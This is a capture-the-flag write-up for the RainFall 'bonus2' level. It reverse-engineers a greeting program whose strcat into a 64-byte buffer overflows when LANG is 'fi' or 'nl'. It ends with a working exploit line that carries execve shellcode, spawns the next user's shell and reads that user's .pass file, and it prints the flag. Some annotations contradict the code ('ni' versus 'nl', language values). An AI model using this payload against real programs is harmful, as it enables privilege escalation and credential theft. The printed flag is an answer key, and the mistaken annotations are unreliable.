
### notes
```c
0x08049988  language    : global variable language
0x08048484  greetuser : called in main
0x08048529  main
```

### 0x08048529 : main() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
{
    int argc = ebp+0x8
    char *argv = ebp+12
    char *buffer[72] = esp+0x50 = esp+80 // 40+32
    char *envLang = esp+0x9c
}
```
_**`<0> ==> <+9> : prepare stack frame for n function with size 160`**_
```c
0x08048529 <+0>:	push   ebp
0x0804852a <+1>:	mov    ebp,esp
0x0804852c <+3>:	push   edi
0x0804852d <+4>:	push   esi
0x0804852e <+5>:	push   ebx
0x0804852f <+6>:	and    esp,0xfffffff0
0x08048532 <+9>:	sub    esp, 0xa0 // 160
```
_**`<+15> ==> <+26> : compare argc to 3 , if equal : jump to main+31 , else : jumpe to +263 (return(1))`**_
```c
0x08048538 <+15>:	cmp    DWORD PTR [argc],3
0x0804853c <+19>:	je     0x8048548 <main+31>
0x0804853e <+21>:	mov    eax,1
0x08048543 <+26>:	jmp    0x8048630 <main+263>
```
_**`<+31> ==> <+49> : copy from eax content to where edi points by 4 bytes each time, (number of times = eax), each time increment edi with 4 bytes until eax reach 0 after decrementting by -1 each loop`**_
```c
0x08048548 <+31>:	lea    ebx,[buffer]
0x0804854c <+35>:	mov    eax,0x0 // eax = 0
0x08048551 <+40>:	mov    edx,0x13 // ~ 19
0x08048556 <+45>:	mov    edi,ebx // edi = buffer
0x08048558 <+47>:	mov    ecx,edx  // ecx = 19
0x0804855a <+49>:	rep stos DWORD PTR es:[edi],eax
buffer[0] = eax ~ 0
buffer[1] = 0
buffer[2] = 0
buffer[3] = 0
...
buffer[19*4=76] = 0
equivalant to memset(buffer, 0, 76)
```
_**`<+51> ==> <+78> : copy 40 bytes from argv[1] to buffer`**_
```c
0x0804855c <+51>:	mov    eax,DWORD PTR [argv]
0x0804855f <+54>:	add    eax,4 // argv[1]
0x08048562 <+57>:	mov    eax,DWORD PTR [eax]  // *argv[1]
0x08048564 <+59>:	mov    DWORD PTR [esp+8],0x28 // param3 = 40
0x0804856c <+67>:	mov    DWORD PTR [esp+4],eax // param2 = argv[1]
0x08048570 <+71>:	lea    eax,[buffer]
0x08048574 <+75>:	mov    DWORD PTR [esp],eax // param1 = buffer
0x08048577 <+78>:	call   0x80483c0 <strncpy@plt> 
                            // strncpy(param1, param2, param3)
strncpy(buffer, argv[1], 40)
//buffer[0-39] = argv[1][0-39]
```
_**`<+83> ==> <+113> : copy 32 bytes from argv[2] to the index 40 from buffer so , will start to copy in the buffer starting from the address of buffer[40]`**_
```c
0x0804857c <+83>:	mov    eax,DWORD PTR [argv]
0x0804857f <+86>:	add    eax,8// argv[2]
0x08048582 <+89>:	mov    eax,DWORD PTR [eax] // *argv[2]
0x08048584 <+91>:	mov    DWORD PTR [esp+8],0x20 // param3 = 32
0x0804858c <+99>:	mov    DWORD PTR [esp+4],eax // param2 = argv[2]
0x08048590 <+103>:	lea    eax,[buffer] // buffer
0x08048594 <+107>:	add    eax,0x28 // buffer[40]
0x08048597 <+110>:	mov    DWORD PTR [esp],eax // param1 = &buffer[40]
0x0804859a <+113>:	call   0x80483c0 <strncpy@plt>
                            // strncpy(param1, param2, param3)
strncpy(&buffer[40], argv[2], 32)
// here we can understand the value of buffer size which is 40+32 = 72
```

_**`<+118> ==> <+145> : get the LANG env variable, if LANG == 0 call greetuser func `**_
```c
0x0804859f <+118>:	mov    DWORD PTR [esp],0x8048738 // ~ "LANG"
0x080485a6 <+125>:	call   0x8048380 <getenv@plt> // env = getenv("LANG")
0x080485ab <+130>:	mov    DWORD PTR [esp+156],eax // envLang = env
0x080485b2 <+137>:	cmp    DWORD PTR [esp+156],0x0 // compare envLang <=to=> 0
0x080485ba <+145>:	je     0x8048618 <main+239> // if envLang == 0 jump to +239 to call greetuser function
if (getenv("LANG") == 0) {
    jump to <main+239>    (greetuser)
}
```
_**`<+147> ==> <+192> : if (envLang == "fi") { language = 1 } else { jump to +239}`**_
```c
0x080485bc <+147>:	mov    DWORD PTR [esp+8],2 // param3 = 2
0x080485c4 <+155>:	mov    DWORD PTR [esp+4],0x804873d // param2 = "fi"
0x080485cc <+163>:	mov    eax,DWORD PTR [envLang] // eax = envLang
0x080485d3 <+170>:	mov    DWORD PTR [esp],eax // param1 = envLang
0x080485d6 <+173>:	call   0x8048360 <memcmp@plt> 
                            // eax = memcmp(param1, param2, param3)
                            eax = memcmp(envLang, "fi", 2)
0x080485db <+178>:	test   eax,eax // eax == 0 ? 
0x080485dd <+180>:	jne    0x80485eb <main+194> if not equal to 0 jump to 194
0x080485df <+182>:	mov    DWORD PTR ds:language,1 // else : language = 1
0x080485e9 <+192>:	jmp    0x8048618 <main+239> // jump to +239 to call greetuser function
if (memcmp(envLang, "fi", 2) == 0) {
    language = 1
    jump to <main+239>    (greetuser)
} else
    jump to  <main+194> (the other memcpy check for "ni")

```
_**`<+194> ==> <+229> : if (envLang == "nl") { language = 2 } else { jump to +239}`**_
```c
0x080485eb <+194>:	mov    DWORD PTR [esp+8,0x2 // param3 = 2
0x080485f3 <+202>:	mov    DWORD PTR [esp+4],0x8048740 // param2 = "nl"
0x080485fb <+210>:	mov    eax,DWORD PTR [envLang] // eax = envLang
0x08048602 <+217>:	mov    DWORD PTR [esp],eax = param1 = envLang
0x08048605 <+220>:	call   0x8048360 <memcmp@plt> 
                            // eax = memcmp(param1, param2, param3)
                            eax = memcmp(envLang, "ni", 2)
0x0804860a <+225>:	test   eax,eax // eax == 0 ? 
0x0804860c <+227>:	jne    0x8048618 <main+239>  if not equal to 0 jump to 239
0x0804860e <+229>:	mov    DWORD PTR ds:language,2 // language = 2
if (memcmp(envLang, "ni", 2) == 0) {
    language = 2
    complete to <main+239>    (greetuser)
}
```
_**`<+239> ==> <+258> : to call a function u need to setup params in stack , in this case we want to call greetuser with buffer value so in order to do that, we copied all content of buffer to esp by rep movs instruction `**_
```c
0x08048618 <+239>:	mov    edx,esp // edx = esp
0x0804861a <+241>:	lea    ebx,[buffer]
0x0804861e <+245>:	mov    eax,0x13 // ~ 19
0x08048623 <+250>:	mov    edi,edx  // edi = esp
0x08048625 <+252>:	mov    esi,ebx // esi = buffer
0x08048627 <+254>:	mov    ecx,eax // ecx = 19
0x08048629 <+256>:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi] // move content of buffer to esp
0x0804862b <+258>:	call   0x8048484 <greetuser> 
                                        // greetuser(esp) 
                                        greetuser(buffer)
```
_**`<+263> ==> <+270> : find the last ebp and quit the programm ~ return 1`**_
```c
0x08048630 <+263>:	lea    esp,[ebp-12]
0x08048633 <+266>:	pop    ebx
0x08048634 <+267>:	pop    esi
0x08048635 <+268>:	pop    edi
0x08048636 <+269>:	pop    ebp
0x08048637 <+270>:	ret
```
### 0x08048484 : greetuser() : disassembly
- notebook: (to convert `hex` to `dec` and assign variable names for better reading)
```c
char *buffer // = ebp-72 
```
_**`<0> ==> <+3> : prepare stack frame for n function with size 160`**_
```c
0x08048484 <+0>:	push   ebp
0x08048485 <+1>:	mov    ebp,esp
0x08048487 <+3>:	sub    esp,88
```
_**`<0> ==> <+9> : prepare stack frame for n function with size 160`**_
```c
0x0804848a <+6>:	mov    eax,ds:language
0x0804848f <+11>:	cmp    eax,0x1
0x08048492 <+14>:	je     0x80484ba <greetuser+54>
0x08048494 <+16>:	cmp    eax,0x2
0x08048497 <+19>:	je     0x80484e9 <greetuser+101>
0x08048499 <+21>:	test   eax,eax
0x0804849b <+23>:	jne    0x804850a <greetuser+134>
```
```
if (language == 1) jump to  <greetuser+54>
if (language == 2) jump to  <greetuser+101>
if (!(language == 0)) jump to  <greetuser+134>
```
```c

0x0804849d <+25>:	mov    edx,0x8048710 // ~ edx = "Hello "
0x080484a2 <+30>:	lea    eax,[buffer] // eax = *buffer
0x080484a5 <+33>:	mov    ecx,DWORD PTR [edx] // ecx = "Hello "
0x080484a7 <+35>:	mov    DWORD PTR [eax],ecx // *eax = "Hello "
0x080484a9 <+37>:	movzx  ecx,WORD PTR [edx+4]
0x080484ad <+41>:	mov    WORD PTR [eax+4],cx
0x080484b1 <+45>:	movzx  edx,BYTE PTR [edx+6]
0x080484b5 <+49>:	mov    BYTE PTR [eax+6],dl
0x080484b8 <+52>:	jmp    0x804850a <greetuser+134>

strcpy(buffer, "Hello ");
jump to   <greetuser+134>
```
```c
0x080484ba <+54>:	mov    edx,0x8048717 // ~ edx = "Hyvää päivää "
0x080484bf <+59>:	lea    eax,[buffer]
0x080484c2 <+62>:	mov    ecx,DWORD PTR [edx]
0x080484c4 <+64>:	mov    DWORD PTR [eax],ecx
0x080484c6 <+66>:	mov    ecx,DWORD PTR [edx+4]
0x080484c9 <+69>:	mov    DWORD PTR [eax+4],ecx
0x080484cc <+72>:	mov    ecx,DWORD PTR [edx+8
0x080484cf <+75>:	mov    DWORD PTR [eax+8,ecx
0x080484d2 <+78>:	mov    ecx,DWORD PTR [edx+12]
0x080484d5 <+81>:	mov    DWORD PTR [eax+12],ecx
0x080484d8 <+84>:	movzx  ecx,WORD PTR [edx+12]
0x080484dc <+88>:	mov    WORD PTR [eax+12],cx
0x080484e0 <+92>:	movzx  edx,BYTE PTR [edx+16]
0x080484e4 <+96>:	mov    BYTE PTR [eax+16],dl
0x080484e7 <+99>:	jmp    0x804850a <greetuser+134>

strcpy(buffer, "Hyvää päivää ");
jump to <greetuser+134>
```
```c
0x080484e9 <+101>:	mov    edx,0x804872a // ~ edx = "Goedemiddag! "
0x080484ee <+106>:	lea    eax,[buffer] // eax = &buffer
0x080484f1 <+109>:	mov    ecx,DWORD PTR [edx] // ecx = *edx
0x080484f3 <+111>:	mov    DWORD PTR [eax],ecx // *eax = *edx
0x080484f5 <+113>:	mov    ecx,DWORD PTR [edx+4] // ecx = edx[1]
0x080484f8 <+116>:	mov    DWORD PTR [eax+4],ecx // buffer[address+4] = edx[address+4]
0x080484fb <+119>:	mov    ecx,DWORD PTR [edx+8
0x080484fe <+122>:	mov    DWORD PTR [eax+8,ecx
0x08048501 <+125>:	movzx  edx,WORD PTR [edx+12]
0x08048505 <+129>:	mov    WORD PTR [eax+12],dx

strcpy(buffer, "Goedemiddag! ");
```
```c
0x08048509 <+133>:	nop // no operation , doesnt affect anything execpt the EIP register ofcourse
```
```c
0x0804850a <+134>:	lea    eax,[ebp+8]
0x0804850d <+137>:	mov    DWORD PTR [esp+4],eax
0x08048511 <+141>:	lea    eax,[buffer]
0x08048514 <+144>:	mov    DWORD PTR [esp],eax
0x08048517 <+147>:	call   0x8048370 <strcat@plt>
strcat(buffer, ebp+8)
strcat(buffer, mainBuffer)
```
```c
0x0804851c <+152>:	lea    eax,[buffer]
0x0804851f <+155>:	mov    DWORD PTR [esp],eax
0x08048522 <+158>:	call   0x8048390 <puts@plt>
puts(buffer)
```
```c
0x08048527 <+163>:	leave
0x08048528 <+164>:	ret
```
### Code Prediction:
```c
int language = 0 // 0x08049988 <=== (gdb) info var


void greetuser(char *mainBuffer) {

    char buffer[64];

    if (language == 1) 
        strcpy(buffer, "Hyvää päivää ");
    
    if (language == 2) 
        strcpy(buffer, "Goedemiddag! ");
    
    if (language == 0) 
        strcpy(buffer, "Hello ");
    
    strcat(buffer, mainBuffer)
    puts(buffer)

}
int main(int argc, char **argv) {
    if (argc != 3) { 0x08048538 <+15>
        return (1)
    }

    char *buffer[72] // = esp+0x50 // 40+32
    char *envLang // = esp+0x9c

    memset(buffer, 0, 76) // 0x08048548 <+31>
    strncpy(buffer, argv[1], 40) //  0x0804855c <+51>
    strncpy(&buffer[40], argv[2], 32) //  0x0804857c <+83>

    envLang = getenv("LANG") 

    if (envLang != 0) { // 0x0804859f <+118>
        if (memcmp(envLang, "fi", 2) == 0) { // 0x080485bc <+147>
            language = 1
        }

           if (memcmp(envLang, "ni", 2) == 0) { // 0x080485eb <+194>
            language = 2
        }
    }

    greetuser(buffer) // 0x08048618 <+239>

    return (0)
}

```
#### Process of the Exploit
* LANG not set
```shell
bonus2@RainFall:~$ unset LANG
bonus2@RainFall:~$ gdb ./bonus2

(gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Hello BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
(gdb)
```

`if LANG not set in env , the global variable Language is 0 and our buffer will get concat with (Hello ), but thats not enough to overwrite EIP`

----

* LANG=fi
```shell
bonus2@RainFall:~$ export LANG=fi
bonus2@RainFall:~$ gdb ./bonus2

(gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Hyvää päivää BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? () // offset : 18
(gdb)
```
 
>if LANG is set to "fi" , the global variable Language is 1 and our buffer will get concat with (Hyvää päivää ), but thats enough to overwrite EIP at the offset of 18

----

* LANG=nl
```shell
bonus2@RainFall:~$ export LANG=nl
bonus2@RainFall:~$ gdb ./bonus2

(gdb) run $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Starting program: /home/user/bonus2/bonus2 $(python -c 'print "B" * 40') Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab
Goedemiddag! BBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x38614137 in ?? () // ofset : 23
(gdb)

```
>if LANG is set to "nl" , the global variable Language is 1 and our buffer will get concat with (Goedemiddag! ), but thats enough to overwrite EIP at the offset of 23



---
### Solution :
- inject the shellcode into argv[1]
- put the address of the buffer in the overflow offset of argv[2]
- argv[1] = [shellcode(21) + suffix(19)] total 40 length
- argv[2] = [prefix(18) + buffer address (0xbffff650) in little endian (4)]


```shell
bonus2@RainFall:~$ /home/user/bonus2/bonus2 $(python -c 'print "\x90" * 19 +"\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"') $(python -c 'print "B" * 18 + "\xbf\xff\xf6\x50"[::-1] ' )
Hyvää päivää �������������������j
                                 X�Rh//shh/bin��1�̀BBBBBBBBBBBBBBBBBBP���
$ whoami
bonus3
$ pwd
/home/user/bonus2
$ cat /home/user/bonus3/.pass
71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587
$
```

|**`flag:71d449df0f960b36e0055eb58c14d0f5d0ddc0b35328d657f91cf0df15910587`**
---

 
